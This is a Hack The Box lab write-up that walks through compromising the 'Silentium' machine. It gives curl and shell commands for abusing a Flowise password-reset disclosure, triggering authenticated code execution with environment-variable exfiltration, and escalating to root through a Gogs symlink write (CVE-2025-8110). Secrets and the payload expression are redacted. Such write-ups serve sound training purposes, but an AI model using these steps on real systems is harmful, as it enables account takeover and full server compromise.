# Hack The Box --- Silentium

> **Platform:** Hack The Box\
> **Target:** `silentium.htb`\
> **OS:** Linux\
> **Status:** Rooted
>
> This report documents an authorized HTB lab. Secrets and flags are
> redacted.

## Attack chain

1.  Enumerate TCP ports 22 and 80.
2.  Discover `staging.silentium.htb` using virtual-host fuzzing.
3.  Identify Flowise 3.0.5 and enumerate its authentication behavior.
4.  Abuse account recovery to disclose a user record and temporary reset
    token.
5.  Reset the `ben@silentium.htb` password and authenticate.
6.  Exploit the authenticated `customMCP` route for JavaScript execution
    and environment-variable exfiltration.
7.  Reuse a discovered credential to SSH to the host as `ben`.
8.  Reach the internal Gogs service through SSH local port forwarding.
9.  Abuse Gogs symlink/contents handling (CVE-2025-8110) to write root's
    SSH `authorized_keys`.
10. SSH as root and retrieve the proof.

## 1. Reconnaissance
## @SAK7TRA (https://github.com/SAK7TRA )
### Port scan

``` bash
nmap -A <TARGET_IP>
sudo nmap -p- --min-rate 3000 -T4 <TARGET_IP>
```

The exposed services were SSH on port 22 and nginx on port 80. The
website redirected to `silentium.htb`, so I added the target to
`/etc/hosts`:

``` text
<TARGET_IP> silentium.htb
```

The marketing site listed Ben as Head of Financial Systems. That name
later helped form a candidate email address.

### Virtual-host discovery

I located the SecLists wordlist at
`/opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt` and ran:

``` bash
ffuf \
  -u http://<TARGET_IP>/ \
  -H 'Host: FUZZ.silentium.htb' \
  -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \
  -fs 178 \
  -fc 301
```

This found `staging.silentium.htb`. I added it to `/etc/hosts` and
browsed to the staging site, which was running Flowise.

## 2. Flowise enumeration

The version endpoint disclosed Flowise `3.0.5`:

``` bash
curl -i http://staging.silentium.htb/api/v1/version
```

The authentication status endpoint returned `401 Unauthorized`:

``` bash
curl -i http://staging.silentium.htb/api/v1/auth/status
```

I compared login responses using a likely email and a deliberately
nonexistent one:

``` bash
curl -i -X POST \
  http://staging.silentium.htb/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"ben@silentium.htb","password":"<WRONG_PASSWORD>"}'
```

A valid email returned `401 Incorrect Email or Password`; a nonexistent
address returned `404 User Not Found`. This difference enabled user
enumeration.

## 3. Account-recovery information disclosure

The `/api/v1/auth/forgot-password` route did not work for this flow. The
account endpoint behaved differently when the email was nested inside a
`user` object:

``` bash
curl -s -X POST \
  http://staging.silentium.htb/api/v1/account/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Instead of a generic recovery response, the endpoint disclosed a user
record containing sensitive fields, including a temporary reset token
and expiry. This was an information-disclosure flaw in the
account-recovery flow.

The reset endpoint accepted the email, temporary token, and a new
password:

``` bash
curl -i -X POST \
  http://staging.silentium.htb/api/v1/account/reset-password \
  -H 'Content-Type: application/json' \
  -d '{
    "user": {
      "email": "ben@silentium.htb",
      "tempToken": "<TEMPORARY_RESET_TOKEN>",
      "password": "<NEW_LAB_PASSWORD>"
    }
  }'
```

It returned `201 Created`. I then logged in, saving the returned cookies
in a cookie jar:

``` bash
curl -i -c cookies.txt -X POST \
  http://staging.silentium.htb/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  -d '{"email":"ben@silentium.htb","password":"<NEW_LAB_PASSWORD>"}'
```

A cookie jar is not the same thing as a Flowise API key. Different
endpoints may require different authentication mechanisms.

## 4. Authenticated code execution in Flowise

The relevant route was:

``` text
POST /api/v1/node-load-method/customMCP
```

It accepted a `loadMethod` and `inputs.mcpServerConfig`. The
vulnerability involved unsafe evaluation of JavaScript configuration
using the `Function` constructor. With an authenticated session and the
expected request header, this led to code execution in the Flowise
process.

The request shape was:

``` bash
curl -s -b cookies.txt \
  -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H 'Content-Type: application/json' \
  -H 'x-request-from: internal' \
  --data '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "<JAVASCRIPT_EXPRESSION>"
    }
  }'
```

The application sometimes returned a generic `No Available Actions`
message. That response alone did not prove whether code executed, so I
verified execution using an outbound HTTP callback.

The callback contained base64-encoded environment variables. Decoding
the response exposed application configuration and credentials. The
public report deliberately omits the actual values because the output
contained passwords and JWT signing secrets.

The important result was credential reuse: a password found in the
environment worked for SSH as `ben` on the host.

## 5. SSH access as `ben`

I connected using SSH:

``` bash
ssh ben@<TARGET_IP>
```

The password included `!`, so I put it in a file rather than passing it
directly as a shell argument:

``` bash
printf '%s' '<DISCOVERED_PASSWORD>' > /tmp/sshpw.txt
chmod 600 /tmp/sshpw.txt
sshpass -f /tmp/sshpw.txt ssh ben@<TARGET_IP>
```

This provided an interactive shell on the target as `ben`. This was a
separate access boundary from code execution inside the Flowise
container.

## 6. Internal Gogs discovery and SSH tunneling

I enumerated the Gogs installation and service configuration:

``` bash
ls -la /opt/gogs
ls -la /opt/gogs/gogs
systemctl status gogs --no-pager
systemctl cat gogs
ss -lntp
```

Gogs was installed under `/opt/gogs`, and its systemd service ran as
`root`. It was available through a local-only port rather than being
directly exposed by the external scan.

I used SSH local port forwarding to reach the internal service from my
machine:

``` bash
ssh -L 9999:127.0.0.1:<GOGS_PORT> ben@<TARGET_IP>
```

With the tunnel open, requests to `http://127.0.0.1:9999` on my machine
reached Gogs on the target. Local-only services are easy to miss if you
rely only on external port scans.

## 7. Gogs symlink privilege escalation

I authenticated to the internal Gogs instance, created a repository I
could modify, and verified that cloning, committing and pushing worked.

I generated a dedicated SSH key pair on my own machine:

``` bash
ssh-keygen -t ed25519 -f /tmp/silentium_root -N ''
cat /tmp/silentium_root.pub
```

I then created a symlink in the repository that pointed to root's
authorized-keys file:

``` bash
ln -s /root/.ssh/authorized_keys symlink
git add symlink
git -c user.email="writeup@example.invalid" \
    -c user.name="writeup" \
    commit -m "Add symlink"
git push
```
## https://github.com/SAK7TRA
Creating a symlink alone does not write to its target. The key issue was
Gogs' vulnerable handling of a contents update: the application followed
the symlink when writing file content. This behavior is associated with
CVE-2025-8110.

I used the Gogs contents API to update the symlink entry with the
base64-encoded SSH **public** key. The successful API response showed
that the entry targeted `/root/.ssh/authorized_keys`.

After the public key had been written, I connected as root using the
matching private key:

``` bash
ssh -i /tmp/silentium_root root@<TARGET_IP>
```

I verified the shell and read the proof:

``` bash
whoami
cd /root
cat root.txt
```

The actual flag is redacted from this public write-up.

## 8. Key takeaways

-   Virtual-host fuzzing can reveal applications that are invisible on
    the main site.
-   Different authentication error responses can disclose valid
    usernames or email addresses.
-   Account-recovery endpoints must never return internal user records
    or temporary secrets.
-   Validate RCE using an observable side effect rather than relying
    only on an application response.
-   Container access and host access are different boundaries.
-   Environment variables can expose credentials and signing secrets.
-   Check loopback-bound services after obtaining a shell; SSH port
    forwarding can expose them safely for assessment.
-   The symlink escalation depended on Gogs' vulnerable write behavior,
    not merely on creating a symlink.
-   Never publish live passwords, reset tokens, cookies, API keys, JWT
    secrets, private keys, or flags in a public repository.

## Summary

Silentium was a multi-stage compromise. Virtual-host discovery led to
Flowise; an account-recovery information disclosure enabled
authentication; unsafe JavaScript evaluation provided code execution and
environment discovery; credential reuse provided SSH access as `ben`;
SSH tunneling exposed internal Gogs; and vulnerable symlink handling
allowed a write to root's `authorized_keys`, leading to root SSH access.

**Disclaimer:** This write-up documents activity in an authorized Hack
The Box lab. Do not use these techniques against systems without
explicit permission.
